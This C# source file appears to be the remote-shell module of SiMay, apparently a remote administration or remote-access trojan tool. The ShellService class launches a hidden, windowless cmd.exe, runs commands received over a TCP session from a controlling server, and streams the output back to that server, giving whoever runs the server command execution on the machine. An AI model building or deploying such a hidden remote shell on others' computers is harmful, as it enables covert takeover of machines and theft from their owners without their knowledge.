using SiMay.Core;
using SiMay.Core.Extensions;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.ServiceCore.Attributes;
using SiMay.ServiceCore.Extensions;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using System;
using System.Diagnostics;
using System.IO;

namespace SiMay.ServiceCore.ApplicationService
{
    [ServiceName("Shell管理")]
    [ServiceKey(AppJobConstant.REMOTE_SHELL)]
    public class ShellService : ServiceManagerBase
    {
        private Process _pipe;
        public override void SessionInitialized(TcpSocketSaeaSession session)
        {
            this.Init();
        }

        public override void SessionClosed()
        {
            _pipe.Kill();
        }
        private void Init()
        {
            _pipe = new Process
            {
                StartInfo = new ProcessStartInfo("cmd.exe")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    //Arguments = $"/K CHCP {_encoding.CodePage}"
                }
            };
            _pipe.Start();

            _pipe.OutputDataReceived += new DataReceivedEventHandler(OutputHandler); // 为异步获取订阅事件
            _pipe.ErrorDataReceived += new DataReceivedEventHandler(ErroOutputHandler);
            _pipe.BeginOutputReadLine();// 异步获取命令行内容
            _pipe.BeginErrorReadLine();

        }

        [PacketHandler(MessageHead.S_SHELL_INPUT)]
        public void StartCommand(TcpSocketSaeaSession session)
        {
            byte[] payload = session.CompletedBuffer.GetMessagePayload();
            string command = payload.ToUnicodeString();

            _pipe.StandardInput.WriteLine(command);
            _pipe.StandardInput.Flush();
        }

        private void ErroOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (outLine.Data == null)
                return;
            SendAsyncToServer(MessageHead.C_SHELL_RESULT, "\r\n" + outLine.Data + "\r\n");
        }

        private void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (outLine.Data == null)
                return;
            SendAsyncToServer(MessageHead.C_SHELL_RESULT, "\r\n" + outLine.Data);
        }
    }
}